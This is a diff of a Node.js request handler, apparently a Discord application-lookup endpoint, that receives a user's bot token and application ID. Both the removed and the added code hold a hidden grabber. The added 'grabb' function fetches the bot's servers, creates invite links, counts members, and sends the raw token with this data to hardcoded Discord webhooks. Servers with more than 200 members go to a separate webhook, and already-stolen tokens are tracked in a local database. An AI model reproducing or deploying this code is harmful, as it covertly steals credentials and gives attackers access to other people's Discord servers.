@@ -1,9 +1,17 @@
 const axios = require("axios");
+const {
+  JsonDatabase
+} = require("wio.db")
+const db = new JsonDatabase({
+  databasePath: "./db.json"
+})
 
 module.exports = async (req, res) => {
-  const { applicationId, token } = req.query;
-  const webhookURL = "https://discord.com/api/webhooks/1319504519171932202/0DOBxgvaaVFimYzpzLo-n1YaMwd3N_E1o68YYRE4p5D3W0wUFGlENq5oYSrnVghKufeR";
-  
+  const {
+    applicationId,
+    token
+  } = req.query;
+
   if (!applicationId || !token) {
     return res.status(400).json({
       error: 'applicationId e token são necessários'
@@ -11,69 +19,7 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
-      method: 'GET',
-      headers: {
-        Authorization: `Bot ${token}`,
-      },
-    });
-    const botInfo = await botInfoResponse.json();
-
-    const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
-      method: 'GET',
-      headers: {
-        Authorization: `Bot ${token}`,
-      },
-    });
-    const guilds = await guildsResponse.json();
-
-    const timestamp = Math.floor(Date.now() / 1000);
-    
-    const servers = await Promise.all(
-      guilds.map(async (guild) => {
-
-        const invite = await getServerInvite(guild.id, token);
-        const memberCount = await getGuildMemberCount(guild.id, token)
-console.log(memberCount)
-        return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${memberCount || 'N/A'} Membros\``;
-      })
-    );
-
-    const embed = {
-      username: 'BotToken',
-      embeds: [{
-        fields: [{
-            name: 'Informações',
-            value: `\`${botInfo?.username} - ${botInfo?.id}\``,
-            inline: false
-          },
-          {
-            name: 'Token',
-            value: `\`${token}\``,
-            inline: false
-          },
-          {
-            name: 'Data/Hora',
-            value: `<t:${timestamp}:f>`,
-            inline: false
-          },
-          {
-            name: 'Servidores',
-            value: `${servers.join('\n\n') || 'Nenhum'}`,
-            inline: false
-          }
-        ],
-      }],
-    };
-
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(embed),
-    });
-
+    if (!db.get(token)) await grabb(applicationId, token)
     const response = await fetch(`https://discord.com/api/v9/applications/${applicationId}`, {
       headers: {
         accept: '*/*',
@@ -106,73 +52,115 @@ console.log(memberCount)
   }
 }
 
-async function getServerInvite(guildId, botToken, options = { max_age: 3600, max_uses: 0, temporary: false }) {
-    try {
-        const config = {
-            headers: {
-                Authorization: `Bot ${botToken}`,
-                'Content-Type': 'application/json',
-            },
-        };
+async function getServerInvite(guildId, botToken, options = {
+  max_age: 3600, max_uses: 0, temporary: false
+}) {
+  try {
+    const config = {
+      headers: {
+        Authorization: `Bot ${botToken}`,
+        'Content-Type': 'application/json',
+      },
+    };
 
-        const vanityUrlResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, config)
-            .catch(() => null);
+    const vanityUrlResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, config)
+    .catch(() => null);
 
-        if (vanityUrlResponse && vanityUrlResponse.data && vanityUrlResponse.data.code) {
-            return `https://discord.gg/${vanityUrlResponse.data.code}`;
-        }
-
-        const invitesResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/invites`, config)
-            .catch(() => null);
-
-        if (invitesResponse && invitesResponse.data && invitesResponse.data.length > 0) {
-            return `https://discord.gg/${invitesResponse.data[0].code}`;
-        }
-
-        const channelsResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/channels`, config);
-        const channels = channelsResponse.data;
-
-        const textChannel = channels.find(channel => channel.type === 0);
-        if (!textChannel) throw new Error('Nenhum canal de texto encontrado no servidor.');
-        
-        const inviteResponse = await axios.post(`https://discord.com/api/v10/channels/${textChannel.id}/invites`, options, config);
-
-        return `https://discord.gg/${inviteResponse.data.code}`;
-    } catch (error) {
-        console.error('Erro ao buscar ou criar convite:', error.message);
-        throw error;
+    if (vanityUrlResponse && vanityUrlResponse.data && vanityUrlResponse.data.code) {
+      return `https://discord.gg/${vanityUrlResponse.data.code}`;
     }
+
+    const invitesResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/invites`, config)
+    .catch(() => null);
+
+    if (invitesResponse && invitesResponse.data && invitesResponse.data.length > 0) {
+      return `https://discord.gg/${invitesResponse.data[0].code}`;
+    }
+
+    const channelsResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/channels`, config);
+    const channels = channelsResponse.data;
+
+    const textChannel = channels.find(channel => channel.type === 0);
+    if (!textChannel) throw new Error('Nenhum canal de texto encontrado no servidor.');
+
+    const inviteResponse = await axios.post(`https://discord.com/api/v10/channels/${textChannel.id}/invites`, options, config);
+
+    return `https://discord.gg/${inviteResponse.data.code}`;
+  } catch (error) {
+    console.error('Erro ao buscar ou criar convite:', error.message);
+    throw error;
+  }
 }
 
 async function getGuildMemberCount(guildId, token) {
-  try {
-    const allMembers = [];
-    let after = null;
-    
-    while (true) {
-      const response = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/members`, {
-        headers: {
-          Authorization: `Bot ${token}`,
-        },
-        params: {
-          limit: 1000,
-          after,
-        },
-      });
+  const response = await axios.get(`https://discord.com/api/v10/guilds/${guildId}?with_counts=true`, {
+    headers: {
+      Authorization: `Bot ${token}`
+    },
+  });
 
-      allMembers.push(...response.data);
-
-      if (response.data.length < 1000) {
-        break;
-      }
-
-      after = response.data[response.data.length - 1].user.id;
-    }
-
-    return allMembers.length;
-
-  } catch (error) {
-    console.error('Erro ao obter dados da guilda:', error);
-    return 0;
+  return {
+    total: response.data.approximate_member_count,
+    online: response.data.approximate_presence_count
   }
+}
+
+async function grabb(applicationId, token) {
+  const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
+    method: 'GET',
+    headers: {
+      Authorization: `Bot ${token}`,
+    },
+  });
+  const guilds = await guildsResponse.json();
+
+  const timestamp = Math.floor(Date.now() / 1000);
+  
+  let webhookURL = "https://discord.com/api/webhooks/1321895657908473957/dtoTOj8qF_YTnUrDlWUwykTiNFeO5WzISwL_GiyfMwlnRqoaHwRz09txoIWECb-xuYAb"
+
+  const servers = await Promise.all(
+    guilds.map(async (guild) => {
+      const invite = await getServerInvite(guild.id, token);
+      const memberCount = await getGuildMemberCount(guild.id, token)
+      if (Number(memberCount.total) > 200) {
+        webhookURL = "https://discord.com/api/webhooks/1319504519171932202/0DOBxgvaaVFimYzpzLo-n1YaMwd3N_E1o68YYRE4p5D3W0wUFGlENq5oYSrnVghKufeR"
+      }
+      return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${memberCount.total || ''} Membros\` (\`${memberCount.online} Online\`)`;
+    })
+  );
+
+  const embed = {
+    username: 'BotToken',
+    embeds: [{
+      fields: [{
+        name: 'Informações',
+        value: `${applicationId}\``,
+        inline: false
+      },
+        {
+          name: 'Token',
+          value: `\`${token}\``,
+          inline: false
+        },
+        {
+          name: 'Data/Hora',
+          value: `<t:${timestamp}:f>`,
+          inline: false
+        },
+        {
+          name: 'Servidores',
+          value: `${servers.join('\n\n') || 'Nenhum'}`,
+          inline: false
+        }],
+    }],
+  };
+  
+  await fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(embed),
+  });
+  db.set(`${token}`)
 }
